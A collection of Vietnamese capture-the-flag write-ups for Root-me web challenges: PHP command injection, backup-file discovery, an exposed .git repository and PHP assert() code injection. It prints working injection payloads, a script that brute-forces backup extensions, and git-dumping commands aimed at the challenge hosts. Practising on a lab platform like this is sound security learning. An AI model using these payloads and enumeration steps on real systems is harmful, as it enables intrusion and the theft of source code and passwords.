[Root-me] PHP - Command injection

Đây là thử thách command injection, biểu mẫu cho phép nhập đầu vào là địa chỉ IP và ping để kiểm tra kết nối. Bằng cách nào đó nhập vào văn bản bên dưới form:

```
127.0.0.1;ls
```

chúng ta có kết quả trả về của lệnh ping và ls.

Vì ở đây đầu vào do người dùng không được filter nên ta có thể thêm bất kì câu lệnh nào

``` 
google.com;php -s index.php
```

ping được thực hiện một lần nữa kèm theo source của PHP được hiển thị highlight cùng với flag (thực ra thì các bạn có thể lấy flag bằng cách view source code)

![](D:\rootme\php-commandinjection\xacMinhMien.png)

FLAG: ...

Attachments: https://owasp.org/www-community/attacks/Command_Injection



====================================================

[Root-me] Backup file

Description: These files are generated automatically 

Solution:

Chúng ta phải khôi phục bản sao lưu của tệp duy nhất hiện tại là index.php để sử dụng mã nguồn của nó và khôi phục lại mật khẩu.

C1: các bạn có thể tạo một tệp exp.py để tự động hóa việc tìm kiếm các file sao lưu.

``` python
import urllib.request

#python3 
#thiết lập một danh sách các phần mở rộng tương ứng với các tệp sao lưu 
list=[".backup",".bck",".old",".save",".bak",".sav","~",".copy",".old",".orig",".tmp",".txt",".back",".bkp",".bac",".tar",".gz",".tar.gz",".zip",".rar"]
 
#tìm các bản sao lưu của tệp 'index'
fichier ="index"
 
#chỉ định máy chủ
hote = "http://challenge01.root-me.org/web-serveur/ch11/"
 
#xem xét mọi phần mở rộng có thể có 
for item in list:
 
   try:
        #tạo chuỗi 'url' tương ứng với url của tệp + phần mở rộng để kiểm tra 
        url = hote + "" + fichier + "" + ".php" + item
        #thiết lập một kết nối 
        result=urllib.request.urlopen(url)
        print (f'{url} + " Code : " + {str(result.getcode())}')
 
   #Cho phép bạn quản lý lỗi 404 trong quá trình kết nối
   except urllib.request.HTTPError as e:
        if e.code == 404:
            print (f'{url}+" Code :  " + {str(e)}')
        else:
            print (f'{url}+" Code :  " + {str(e)}')
```

C2:  Phần mềm dirb trên kali linux cho phép tấn công từ điển vào url

```
dirb http://challenge01.root-me.org/web-serveur/ch11/index.php  /usr/share/wordlists/dirb/mutations_common.txt -t
```

- Đường dẫn “`/usr/share/wordlists/dirb/mutations_common.txt`” là của một từ điển mở rộng sao lưu, được hiển thị theo mặc định trên kali. 
- "-t" cho biết dirb không thêm "`/`" vào cuối url

Sau đó nhận được kết quả trả về dạng:

![image-20210901163308240](C:\Users\ADMIN\AppData\Roaming\Typora\typora-user-images\image-20210901163308240.png)

Mình sử dụng curl để get file:

```
curl --url http://challenge01.root-me.org/web-serveur/ch11/index.php~
```

Sau khi có được username và password login vào xuất hiện thông báo dùng passwd để bypass thử thách.



========================================================================



[Root-me] Insecure Code Management

*Description*: Protect the source code management server? 

*States*: Recover the password (in clear) for the admin account. 

Từ hint có thể thấy đây là lỗ hổng quản lí mã nguồn không an toàn, mình nhanh chóng suy ra rằng cần một kho lưu trữ git.

Tải xuống các tệp bằng wget:

``` 
wget mirror http://challenge01.root-me.org/web-server/ch26/.git
```

Khi đã định vị trong thư mục chứa thư mục .git chúng ta có thể truy xuất thông tin về mã nguồn bằng lệnh `git checkout`

output cho kết quả: 

![](D:\rootme\insecure source code\list.png)

Từ `git log` có thể thấy các commit cũ, có 1 commit khá thú vị về changed password:

```
$ git log
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date:   Mon Sep 23 15:10:07 2019 +0200

    renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date:   Sun Sep 22 12:38:32 2019 +0200

    changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date:   Thu Sep 12 11:10:06 2019 +0200

    secure auth with md5

commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John <john@bs-corp.com>
Date:   Thu Sep 5 11:10:15 2019 +0200
```



từ đây ra được flag...

![](D:\rootme\insecure source code\pass.png)

Flag: {co_lam_moi_co_an_hihi}

ps: Các bạn cũng có thể dùng công cụ nikto hoặc gitDumper để giải quyết thử thách.

``` 
$ ./gitdumper.sh http://challenge01.root-me.org/web-serveur/ch61/.git/ repo
```

Nhận các commit: 

```
cd repo/ && git log --graph
```

Go back in time: 

```
$git reset --hard
$cat config.php
```

Go back in time một lần nữa để thấy flag:

```	
$git checkout a8673b295eca6a4fa820706d5f809f1a8b49fcba
```



============================================================================



[Root-me] PHP - assert()

*Hint*: Find and exploit the vulnerability to read the .passwd file. 

Như đề bài cho hint liên quan đến assert(). Hàm assert() kiểm tra chuỗi được truyền vào dưới dạng tham số và phát hiện lỗi login, nếu biểu thức đầu vào có giá trị là false, hàm assert() sẽ in ra thông báo lỗi, nếu không chương trình tiếp tục thực thi như thường. Vì vậy mình đã thử payload như sau:

```
?page='xxx'
```

Nhận được thông báo lỗi: 

```
Parse error: syntax error, unexpected 'xxx' (T_STRING) in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'xxx'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
```

Qua thông báo lỗi mình bắt đầu hình dung ra ý tưởng inject command. Thử một loạt các kiểu chèn mình thấy rằng có thể thực thi mã bằng cách nối các dấu ngoặc kép. Ý tưởng là thử với hàm system(). Hàm system() là chạy một chương trình bên ngoài và hiển thị kết quả. Cú pháp như sau: system("command")

Do đó mình có thể hiển thị thông tin trước khi đưa ra thông báo lỗi.

```
'.system("ls -la").'
```

Bingo. Thông tin về các tập lệnh đã được hiển thị, trong đó có file ".passwd"

Bước còn lại khá đơn giản rồi, cat file đó ra và nhận được flag.



=============================================================================



[Root-me] PHP - filter

States:

Find the "administrator" password for thi application

Như tittle đề bài thì đây vẫn là một thử thách LFI, nhưng khác ở cái là có filter. 

